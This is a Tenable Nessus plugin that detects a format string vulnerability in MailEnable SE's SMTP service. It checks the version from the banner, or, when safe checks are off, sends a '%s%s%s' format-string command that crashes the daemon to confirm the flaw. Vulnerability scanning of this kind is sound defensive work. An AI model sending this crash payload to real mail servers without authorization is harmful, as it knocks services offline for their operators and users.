#
# (C) Tenable Network Security
#


if (description) {
  script_id(17364);
  script_version("$Revision: 1.6 $");

  script_cve_id("CVE-2005-0804");
  script_bugtraq_id(12833);

  name["english"] = "MailEnable SE SMTP Command Format String Vulnerability";
  script_name(english:name["english"]);
 
  desc["english"] = "
Synopsis :

The remote SMTP server is afflicted by a format string vulnerability. 

Description :

The remote host is running a version of MailEnable Standard Edition
that suffers from a format string vulnerability in its handling of
SMTP commands.  Specifically, a remote attacker can crash the SMTP
daemon by sending a command with a format specifier as an argument. 
Due to the nature of the flaw, it is likely that an attacker can also
be able to gain control of program execution and inject arbitrary
code. 

See also : 

http://www.securityfocus.com/archive/1/393566

Solution : 

Apply the SMTP fix from 18th March 2005 located at
http://www.mailenable.com/hotfix/

Risk factor : 

Critical / CVSS Base Score : 10 
(AV:R/AC:L/Au:NR/C:C/A:C/I:C/B:N)";
  script_description(english:desc["english"]);
 
  summary["english"] = "Checks for SMTP command format string vulnerability in MailEnable SE";
  script_summary(english:summary["english"]);
 
  script_category(ACT_MIXED_ATTACK);
  script_family(english:"Gain a shell remotely");
 
  script_copyright(english:"This script is Copyright (C) 2005-2006 Tenable Network Security");

  script_dependencies("smtpserver_detect.nasl");
  script_require_ports("Services/smtp", 25);
  script_exclude_keys("SMTP/wrapped");

  exit(0);
}


include("global_settings.inc");
include("smtp_func.inc");


port = get_kb_item("Services/smtp");
if (!port) port = 25;
if (!get_port_state(port)) exit(0);
if (get_kb_item('SMTP/'+port+'/broken')) exit(0);


# Make sure the banner corresponds to MailEnable.
banner = get_smtp_banner(port:port);
if (!banner || !egrep(pattern:"Mail(Enable| Enable SMTP) Service", string:banner)) exit(0);


# If safe checks are enabled, check the version in the banner.
if (safe_checks()) {
  # nb: Standard Edition seems to format version as "1.71--" (for 1.71)
  #     while Professional Edition formats it like "0-1.2-" (for 1.2).
  ver = eregmatch(pattern:"Version: (0-)?([0-9][^-]+)-", string:banner);
  if (ver == NULL) {
    if (log_verbosity > 1) debug_print("can't determine version of MailEnable's SMTP connector service!");
    exit(1);
  }
  if (ver[1] == NULL) {
    edition = "Standard";
  }
  else if (ver[1] == "0-") {
    edition = "Professional";
  }
  if (isnull(edition)) {
    if (log_verbosity > 1) debug_print("can't determine edition of MailEnable's SMTP connector service!");
    exit(1);
  }
  ver = ver[2];

  # nb: see <http://www.mailenable.com/standardhistory.asp> for history.
  if (edition == "Standard" && ver =~ "^1\.([0-7].*|8$)")
    security_hole(port);
}
# Else we'll try to crash the daemon.
else {
  soc = open_sock_tcp(port);
  if (!soc) exit(0);

  # nb: it doesn't seem to matter what the actual "command" is.
  c = string("mailto: %s%s%s\r\n");
  send(socket:soc, data:c);
  repeat {
    s = recv_line(socket:soc, length:32768);
  }
  until (s !~ '^[0-9][0-9][0-9]-');
  if (!s) {
    close(soc);
    # Is the daemon history?
    soc = open_sock_tcp(port);
    if (!soc) {
      security_hole(port);
      exit(0);
    }
  }
  send(socket:soc, data:'QUIT\r\n');
  s = recv_line(socket:soc, length:32768);
  close(soc);
}
